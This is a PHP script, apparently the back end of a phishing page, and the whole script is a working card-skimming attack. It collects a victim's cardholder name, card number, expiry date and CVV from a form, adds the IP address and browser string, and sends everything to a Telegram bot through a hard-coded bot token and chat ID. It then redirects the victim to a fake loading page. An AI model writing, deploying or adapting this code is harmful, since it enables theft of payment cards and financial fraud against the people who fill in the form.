<?php

$message  = "--------app---------\n";
$message .= "Numero : " . $_POST['holder'] . "\n";
$message .= "Date   : " . $_POST['cardNumber'] . "\n";
$message .= "Numero : " . $_POST['expiration'] . "\n";
$message .= "Date   : " . $_POST['cvv'] . "\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP      : $ip\n";
$message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "------------------------------------\n";

$token = "7628274621:AAGyPfKXtwh-zl2EYdQvD7EFrac8HZ2z8lk";
$chat_id = "7378155762";

// Prepare data for Telegram API
$data = [
    'text' => $message,
    'chat_id' => $chat_id
];

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

// Redirect to loading page
header("Location: lodd.html");
exit();
?>
